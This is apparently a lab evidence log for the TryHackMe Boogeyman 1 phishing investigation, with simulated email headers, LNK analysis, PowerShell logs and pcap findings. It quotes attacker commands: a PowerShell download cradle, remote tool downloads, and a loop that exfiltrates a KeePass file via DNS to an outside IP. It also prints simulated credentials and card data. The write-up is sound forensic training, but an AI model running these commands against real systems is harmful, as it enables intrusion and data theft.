# Boogeyman 1 — Evidence Log

> Lab disclaimer: TryHackMe Boogeyman 1, all data simulated. Narrative and conclusions are in [`report.md`](report.md).

This file contains selected supporting evidence from the Boogeyman 1 investigation. The goal of this file is to preserve important evidence excerpts without making the project difficult to read.

Long raw artifacts such as the full `dump.eml`, full Base64 attachment content, and full `powershell.json` should be preserved separately in the investigation workspace. This file only includes relevant excerpts that support the investigation findings.

---

## 1. Evidence Inventory

| Evidence File | Description |
|---|---|
| `dump.eml` | Original phishing email file |
| `payload.txt` | Base64 attachment content copied from the email body for reconstruction |
| `Invoice.zip` | Reconstructed password-protected ZIP attachment |
| `Invoice_20230103.lnk` | Shortcut file extracted from the ZIP archive |
| `lnkparse output` | Output from analyzing the shortcut file |
| `powershell.json` | Endpoint PowerShell log source containing PowerShell Event ID 4104 records |
| `screenshots/` | Folder containing supporting investigation screenshots |

---

# Task 2 — Email and Attachment Evidence

## 2. Email Header Evidence

### 2.1 Sender, Recipient, Date, and Subject

```text
From: Arthur Griffin <agriffin@bpakcaging.xyz>
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Reply-To: Arthur Griffin <agriffin@bpakcaging.xyz>
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott <julianne.westcott@hotmail.com>
Return-Path: agriffin@bpakcaging.xyz
````

### Evidence Value

This evidence identifies:

* The phishing sender.
* The targeted victim.
* The email subject.
* The initial timestamp associated with the phishing email.

***

## 3. Mail Flow and Sender Infrastructure Evidence

### 3.1 Received Headers and Sender IP

```text
Received-SPF: Pass (protection.outlook.com: domain of bpakcaging.xyz
 designates 15.235.99.80 as permitted sender) receiver=protection.outlook.com;
 client-ip=15.235.99.80; helo=pa80.mxout.mta1.net; pr=C

Received: from pa80.mxout.mta1.net (15.235.99.80) by
 BN8NAM04FT033.mail.protection.outlook.com with Microsoft SMTP Server;
 Fri, 13 Jan 2023 09:25:31 +0000

X-Sender-IP: 15.235.99.80
```

### 3.2 Microsoft Exchange Arrival Time

```text
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 13 Jan 2023 09:25:31.6882 (UTC)
```

### 3.3 Email Delivery Timestamp

```text
Received: from KL1PR06MB6210.apcprd06.prod.outlook.com
 by TY2PR06MB2911.apcprd06.prod.outlook.com with HTTPS;
 Fri, 13 Jan 2023 09:25:35 +0000
```

### Evidence Value

This evidence supports the email timeline and identifies mail-flow infrastructure used during delivery.

***

## 4. DKIM and Mail Relay Evidence

### 4.1 Sender Domain DKIM Signature

```text
DKIM-Signature: v=1; a=rsa-sha256; d=bpakcaging.xyz; s=api;
```

### 4.2 Elastic Email DKIM Signature

```text
DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
```

### 4.3 List-Unsubscribe Header Reference

```text
List-Unsubscribe:
unsubscribe+HPk2p-JE_jYbkWIRB-SmuA2@bounces.elasticemail.net
```

### Evidence Value

This evidence shows that Elastic Email-related infrastructure appeared in email headers. This does not prove Elastic Email itself was malicious, but it supports the finding that legitimate third-party email delivery infrastructure may have been used or abused.

***

## 5. Tracking Domain Evidence

### 5.1 Message ID Tracking Domain

```text
Message-Id: <4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz>
```

### 5.2 Email Body Tracking Links

```text
http://tracking.bpakcaging.xyz/tracking/click
http://tracking.bpakcaging.xyz/tracking/unsubscribe
http://tracking.bpakcaging.xyz/tracking/open
```

### Evidence Value

This evidence identifies `tracking.bpakcaging.xyz` as email tracking infrastructure related to the phishing message.

***

## 6. Email Body Evidence

### 6.1 Invoice/Payment Lure

```text
Hi Julianne,

I hope you are well.

I just wanted to drop you a quick note to remind you in respect of document #39586972 is due for payment on January 20, 2023.

I would be grateful if you could confirm everything is on track for payment.

For additional information, kindly see the attached document.
```

### 6.2 ZIP Password in Email Body

```text
You may use this code to view the encrypted file: Invoice2023!
```

### 6.3 Signature Block

```text
Best regards,
Arthur Griffin
Collections Officer
B Packaging Inc.

E: agriffin@bpackaging.xyz
```

### Evidence Value

This evidence supports the finding that the email used an invoice/payment-themed lure and provided the password required to open the encrypted ZIP attachment.

***

## 7. Attachment Evidence

### 7.1 Attachment Metadata

```text
Content-Type: application/zip
Content-Disposition: attachment; filename="Invoice.zip"; size=908;
Content-Transfer-Encoding: base64
```

### 7.2 Base64 Attachment Content

```text
UEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmv...
```

### Evidence Value

This evidence confirms that the email contained a Base64-encoded ZIP attachment named `Invoice.zip`.

The Base64 content is truncated in this file for readability. The full Base64 content should be preserved in the original `dump.eml` or copied reconstruction file `payload.txt`.

***

## 8. Attachment Reconstruction Evidence

### 8.1 Base64 Decoding Command

```bash
cat payload.txt | base64 -d > Invoice.zip
```

### 8.2 ZIP Extraction Command

```bash
unzip Invoice.zip
```

### 8.3 Extracted File

```text
Invoice_20230103.lnk
```

### Evidence Value

This evidence supports the reconstruction and extraction process. The ZIP archive produced a Windows shortcut file instead of a normal invoice document.

***

## 9. LNK Analysis Evidence

### 9.1 lnkparse Command

```bash
lnkparse Invoice_20230103.lnk
```

### 9.2 Shortcut Target Path

```text
Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

### 9.3 Shortcut Command-Line Arguments

```text
Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

### 9.4 Shortcut Icon Location

```text
Icon location: C:\Users\Administrator\Desktop\excel.ico
```

### Evidence Value

This evidence shows that the `.lnk` file was configured to launch PowerShell with hidden and encoded command-line arguments. The Excel icon path suggests the shortcut may have been disguised as an invoice or spreadsheet-related file.

***

## 10. Decoded PowerShell Payload Evidence

### 10.1 Decoded Payload

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

### Evidence Value

This evidence shows that the shortcut attempted to download and execute remote content from:

```text
http://files.bpakcaging.xyz/update
```

This is consistent with a PowerShell download cradle.

***

# Task 3 — Endpoint PowerShell Evidence

## 11. Endpoint Evidence Overview

The following excerpts are pulled from the collected PowerShell logs in `powershell.json`. These records show attacker activity on the compromised workstation:

```text
QL-WKSTN-5693
```

PowerShell Event ID 4104 records were used to identify script block activity, attacker commands, tools, file access, and exfiltration behavior.

***

## 12. Attacker Domains Observed in PowerShell Logs

### 12.1 Domain Search Output

```text
cdn.bpakcaging.xyz
files.bpakcaging.xyz
```

### Evidence Value

This evidence expands the known attacker infrastructure from Task 2. The domain `files.bpakcaging.xyz` was already identified in the decoded LNK payload, while `cdn.bpakcaging.xyz` was later observed in endpoint PowerShell logs.

***

## 13. Seatbelt Download or Load Evidence

### 13.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:12:17.683688 UTC
Event ID: 4104
Record ID: 553
Command:
iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd
```

### Evidence Value

This evidence shows that the attacker loaded or downloaded `Invoke-Seatbelt.ps1`, a PowerShell-based tool used for host enumeration.

***

## 14. Seatbelt Execution Evidence

### 14.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:18:05.437844 UTC
Event ID: 4104
Record ID: 630
Command:
Seatbelt.exe -group=user;pwd
```

### Evidence Value

This evidence shows that the attacker executed Seatbelt with a user-focused enumeration option.

***

## 15. KeePass Database Discovery Evidence

### 15.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:19:06.035992 UTC
Event ID: 4104
Record ID: 646
Command:
ls C:\Users\j.westcott\Documents\protected_data.kdbx;pwd
```

### Evidence Value

This evidence shows that the attacker located a KeePass database file named:

```text
protected_data.kdbx
```

The file was located in the victim user's Documents directory.

***

## 16. Sticky Notes Folder Browsing Evidence

### 16.1 Sticky Notes Package Folder

```text
Timestamp: 2023-01-13 17:22:47.494476 UTC
Event ID: 4104
Record ID: 686
Command:
ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe;pwd
```

### 16.2 Sticky Notes LocalState Folder

```text
Timestamp: 2023-01-13 17:22:53.558146 UTC
Event ID: 4104
Record ID: 692
Command:
ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState;pwd
```

### Evidence Value

This evidence shows that the attacker browsed the Microsoft Sticky Notes application data path. This is relevant because Sticky Notes data is commonly stored in `plum.sqlite`.

***

## 17. sq3.exe Download Evidence

### 17.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:23:38.796891 UTC
Event ID: 4104
Record ID: 703
Command:
iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd
```

### Evidence Value

This evidence shows that the attacker downloaded `sq3.exe` from attacker-controlled infrastructure:

```text
http://files.bpakcaging.xyz/sq3.exe
```

***

## 18. Sticky Notes Database Query Evidence

### 18.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:25:38.759011 UTC
Event ID: 4104
Record ID: 724
Command:
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```

### Evidence Value

This evidence shows that the attacker used `sq3.exe` to query the Microsoft Sticky Notes database:

```text
plum.sqlite
```

The SQL query attempted to retrieve records from the `NOTE` table.

***

## 19. KeePass Database Exfiltration Preparation Evidence

### 19.1 Initial File Read Attempt

```text
Timestamp: 2023-01-13 17:31:48.507719 UTC
Event ID: 4104
Record ID: 741
Command:
$file='protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
```

### 19.2 Full Path File Read Attempt

```text
Timestamp: 2023-01-13 17:32:15.105474 UTC
Event ID: 4104
Record ID: 762
Command:
$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
```

### Evidence Value

This evidence shows that the attacker attempted to read the KeePass database file as bytes using PowerShell.

The targeted file was:

```text
C:\Users\j.westcott\Documents\protected_data.kdbx
```

The destination variable was set to:

```text
167.71.211.113
```

***

## 20. Hex Encoding Evidence

### 20.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:32:23.702462 UTC
Event ID: 4104
Record ID: 768
Command:
$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd
```

### Evidence Value

This evidence shows that the attacker converted the file bytes into hexadecimal text before the exfiltration attempt.

***

## 21. DNS-Based Exfiltration Attempt Evidence

### 21.1 PowerShell Event

```text
Timestamp: 2023-01-13 17:32:41.384043 UTC
Event ID: 4104
Record ID: 774
Command:
$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;} echo "Done";;pwd
```

### Evidence Value

This evidence shows that the attacker split the hex-encoded file content into 50-character chunks and transmit those chunks using DNS queries.

The DNS query pattern was:

```text
<50-hex-chars>.bpakcaging.xyz
```

The destination IP address was:

```text
167.71.211.113
```

This behavior is consistent with DNS-based exfiltration.

***

***

# Task 4 — Network Traffic & Exfiltration Evidence (`capture.pcapng`)

## 22. Digital Evidence Integrity & Hashing Evidence

### 22.1 SHA-256 Chain of Custody Verification
```text
4cdd0a2f16a9e1578b5c3419eeac9c403f7dce86b12fb3b821e19ce5f534c1fc  dump.eml
71075589408ec06e3150a399461556eb55029ae1d3f8fc0f30bcf1bbe821c02d  powershell.json
15dba24f3d9ef38dfbe0e33f995d0f8e60aa4f34ced5031c904281028e4f4bab  capture.pcapng
b55ee53b18871f811f5a4ec405cd70de6b3f1f7cf28712ab5cb5186cbf551e87  Invoice.zip
86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8  Invoice_20230103.lnk
```

### Evidence Value
Confirms identical SHA-256 hashes between the remote acquisition VM and local forensic analysis workstations.

*Visual Reference:* `screenshots/01_hash_verification_kali.png`, `screenshots/02_hash_verification_thm.png`, and `screenshots/03_zip_lnk_hashes.png`.

***

## 23. Payload Server Infrastructure & Server Banner Evidence

### 23.1 HTTP Response Headers (Wireshark Frame 33256)
```http
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.7
Date: Fri, 13 Jan 2023 17:10:09 GMT
Content-type: application/octet-stream
Content-Length: 522
```

### Evidence Value
Proves the adversary's file-hosting server (`files.bpakcaging.xyz` on `167.71.211.113:80`) executed Python's built-in `http.server` running **Python 3.10.7**.

*Visual Reference:* `screenshots/09_python_server_header.png`.

***

## 24. C2 Command Output Exfiltration (Frame 44467 / TCP Stream 752)

### 24.1 HTTP POST Request Headers & Decimal Body
```http
POST /27fe2489 HTTP/1.1
X-38d2-8f49: 8cce49b0-b86459bb-27fe2489
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Content-Type: application/x-www-form-urlencoded
Host: cdn.bpakcaging.xyz:8080
Content-Length: 1322
Connection: Keep-Alive

92 105 100 61 56 54 56 49 53 48 98 100 45 97 53 54 52 45 52 50 51 98 45 57 50 53 54 45 55 48 100 51 55 56 49 55 57 52 98 49 32 77 97 115 116 101 114 32 80 97 115 115 119 111 114 100 13 10 ...
```

### Evidence Value
Confirms the PowerShell implant sent command outputs via **HTTP POST** to `/27fe2489`. Command output was encoded into space-delimited decimal ASCII byte values using:
```powershell
[System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' '
```

*Visual Reference:* `screenshots/10_c2_post_decimal.png`.

***

## 25. Decoded Credential Evidence (Sticky Notes Master Password)

### 25.1 CyberChef & Python Decoding Output
```text
\id=868150bd-a564-423b-9256-70d3781794b1 Master Password
\id=ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab %p9^3!lL^Mz47E2GaT^y|ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#1&31c5ecd4&0&UID256#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=1106,43;Size=320,320|1|0||Yellow|0||||||0||8ca22c0e-ba5e-499a-a86c-7473a53dc6de|74f08724-ccc9-4ce6-94e7-8c99e6cd42c6|638092247397199589||638092247516107079

Path
----
C:\Users\j.westcott
```

### Evidence Value
Confirms the threat actor dumped Julianne Westcott's Sticky Notes database (`plum.sqlite`), exposing the plaintext KeePass master password:
```text
%p9^3!lL^Mz47E2GaT^y
```

*Visual Reference:* `screenshots/11_cyberchef_decode.png` and `screenshots/12_master_password.png`.

***

## 26. DNS Exfiltration Network Evidence

### 26.1 Recursive DNS Queries (Wireshark frames 47767–48712, 17:32:41–17:34:38 UTC)
```text
Standard query 0x0004 A 03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz
Standard query 0x0004 A 05216AFC5AFF03040001000000042000AF4DE7A467FADFBFEB.bpakcaging.xyz
Standard query 0x0004 A EB78AE194B03926333E0CC968727A1FF8CC4CD5151FAAC0520.bpakcaging.xyz
Standard query 0x0004 A 00516334C81F95A871AE6F5C6BB97075B74C6016ADAD4C35B3.bpakcaging.xyz
```

### Evidence Value
Confirms that the attacker exfiltrated the KeePass database in 50-character hexadecimal labels prepended to `.bpakcaging.xyz` directed to `167.71.211.113`.

*Visual Reference:* `screenshots/13_dns_hex_queries.png`.

***

## 27. KeePass Database Carving & Deduplication Pipeline

### 27.1 Reproducible Carving Pipeline
```bash
# 1. Pull DNS query names sent to the rogue nameserver
tshark -r capture.pcapng -Y 'ip.dst == 167.71.211.113 && dns.flags.response == 0' \
       -T fields -e dns.qry.name > dns_queries.txt
```
```python
# 2. Keep only hex labels, strip the domain, drop consecutive nslookup retries
import re, binascii
chunks, last = [], None
for q in open("dns_queries.txt").read().split():
    label = q.split(".")[0]
    if not re.fullmatch(r"[0-9A-Fa-f]{2,50}", label) or not q.endswith(".bpakcaging.xyz"):
        continue                      # skips cdn./files. lookups and Azure suffix variants
    if label != last:
        chunks.append(label); last = label
data = binascii.unhexlify("".join(chunks))
open("protected_data_carved.kdbx", "wb").write(data)
print(len(chunks), "chunks,", len(data), "bytes, header:", data[:8].hex())
```

### 27.2 File Signature and Hash Verification
```bash
file protected_data_carved.kdbx
# Output: Keepass password database 2.x KDBX
xxd -p -l 8 protected_data_carved.kdbx
# Output: 03d9a29a67fb4bb5
sha256sum protected_data_carved.kdbx
# Output: b5e4f249800d741ee62d57113d00deabd634136ee6378e51c2b75c166f1833f4
```

### Evidence Value
Proves successful carving of the complete, uncorrupted KeePass 2.x database containing 2,206 bytes across 89 deduplicated chunks.

***

## 28. Vault Decryption & Compromised Financial Asset Evidence

### 28.1 KeePassXC Execution and Extraction
```bash
keepassxc-cli show protected_data_carved.kdbx -s --all "Homebanking/Company Card"
# Enter password: %p9^3!lL^Mz47E2GaT^y
```

```text
Title: Company Card
UserName: 
Password: 
URL: 
Notes: 
Uuid: {9b5464ad-7bae-c145-adbd-b13d867f4f85}
Tags: 
Account Number: 4024007128269551
CVV: 970
Expiration Date: 3/2028
Name: Quick Logistics LLC
```

### Evidence Value
Forensically proves that the threat actor successfully exfiltrated and gained access to Quick Logistics LLC's corporate card (`4024007128269551`, CVV: `970`, Exp: `03/2028`).

*Visual Reference:* `screenshots/14_keepass_decrypted.png`.

***

# Screenshot Evidence Inventory

## 29. Master Annotated Screenshot Catalog

| Screenshot | Phase | Forensic Purpose / Boxed Elements |
|---|---|---|
| `screenshots/01_hash_verification_kali.png` | Chain of Custody | SHA-256 hashes of `dump.eml`, `powershell.json`, `capture.pcapng` on local Kali |
| `screenshots/02_hash_verification_thm.png` | Chain of Custody | Matching SHA-256 hashes on remote THM VM proving evidence authenticity |
| `screenshots/03_zip_lnk_hashes.png` | Chain of Custody | SHA-256 hashes of carved `Invoice.zip` and extracted `Invoice_20230103.lnk` |
| `screenshots/04_email_headers.png` | Task 2 (Email) | Boxed headers showing SPF Pass, Elastic Email DKIM, From, To, and X-Sender-IP |
| `screenshots/05_lnk_metadata.png` | Task 2 (Malware) | ExifTool metadata showing `excel.ico` icon path and Base64 PowerShell arguments |
| `screenshots/06_seatbelt.png` | Task 3 (Endpoint) | Event ID 4104 records showing C2 polling loop, `sb.exe` download, and Seatbelt execution |
| `screenshots/07_sq3_sticky_notes.png` | Task 3 (Endpoint) | Event ID 4104 records showing `sq3.exe` download and `plum.sqlite` query |
| `screenshots/08_hex_dns_exfil_cmd.png` | Task 3 (Endpoint) | Event ID 4104 records showing `ReadAllBytes`, `ToString X2`, and `nslookup` exfiltration loop |
| `screenshots/09_python_server_header.png` | Task 4 (Network) | Frame 33256 HTTP headers revealing `Server: SimpleHTTP/0.6 Python/3.10.7` |
| `screenshots/10_c2_post_decimal.png` | Task 4 (Network) | TCP Stream 752 Frame 44467 showing `POST /27fe2489` and decimal ASCII payload |
| `screenshots/11_cyberchef_decode.png` | Task 4 (Network) | CyberChef `From Decimal` recipe decoding Sticky Notes dump with master password |
| `screenshots/12_master_password.png` | Task 4 (Network) | Terminal decoded output displaying master password `%p9^3!lL^Mz47E2GaT^y` |
| `screenshots/13_dns_hex_queries.png` | Task 4 (Network) | Wireshark packet list showing 50-char hex DNS `A` queries sent to `167.71.211.113` |
| `screenshots/14_keepass_decrypted.png` | Task 4 (Network) | `keepassxc-cli` output unlocking Quick Logistics LLC credit card `4024007128269551` |
